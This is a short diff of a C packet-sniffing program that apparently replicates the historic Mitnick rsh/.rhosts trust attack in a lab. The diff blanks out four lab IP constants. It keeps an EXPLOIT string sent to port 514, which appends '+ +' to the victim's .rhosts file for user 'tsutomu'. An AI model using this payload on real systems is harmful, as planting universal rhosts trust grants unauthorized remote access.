@@ -9,10 +9,10 @@
 #include "packetsniffer.h"
 #include <pcap/pcap.h>
 
-#define KEVINIP "172.16.45.2"
-#define SERVERIP "172.16.45.3"
-#define XTERMINALIP "172.16.45.4"
-#define SNIFFIP "172.16.45.5"
+#define KEVINIP ""
+#define SERVERIP ""
+#define XTERMINALIP ""
+#define SNIFFIP ""
 #define SRCPORT 514
 #define DSTPORT 514
 #define EXPLOIT "0\0tsutomu\0tsutomu\0echo -e '\n+ +' >> .rhosts"
